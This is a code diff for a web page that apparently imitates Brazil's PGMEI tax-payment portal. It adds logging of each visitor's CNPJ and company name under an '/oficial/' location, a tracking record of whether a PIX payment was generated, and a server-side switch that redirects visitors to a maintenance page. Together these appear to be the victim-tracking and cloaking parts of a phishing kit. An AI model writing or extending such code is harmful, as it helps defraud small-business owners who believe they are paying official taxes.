@@ -23,6 +23,7 @@
   async function loadStateAndGuard() {
     try {
       const state = await window.PGMEI.fetchState();
+      window.PGMEI.applyPageTitleByState(state);
       if (state.analytics.activePage === "secondary") {
         window.PGMEI.redirect("/manutencao/");
         return false;
@@ -85,7 +86,20 @@
 
       const companyData = await lookupCompany(cnpjDigits, cnpjMask);
       window.PGMEI.saveSession(companyData);
-      await window.PGMEI.incrementMetric("cnpjLogins", 1);
+      const trackingState = await window.PGMEI.sendAction("track_cnpj_access", {
+        cnpj: companyData.cnpj,
+        companyName: companyData.nome,
+        location: "/oficial/"
+      });
+      const currentAccess = (trackingState.analytics.accessLog || [])[0] || null;
+      if (currentAccess) {
+        window.PGMEI.saveTrackingSession({
+          time: currentAccess.time,
+          cnpj: companyData.cnpj,
+          companyName: companyData.nome,
+          pixGenerated: false
+        });
+      }
       window.PGMEI.redirect("/oficial/");
     } catch (error) {
       toastr.error(error.message || "Nao foi possivel concluir o acesso.", "Erro");
@@ -95,6 +109,7 @@
   }
 
   document.addEventListener("DOMContentLoaded", async function() {
+    window.PGMEI.applyPageTitleByState();
     if (!(await loadStateAndGuard())) {
       return;
     }
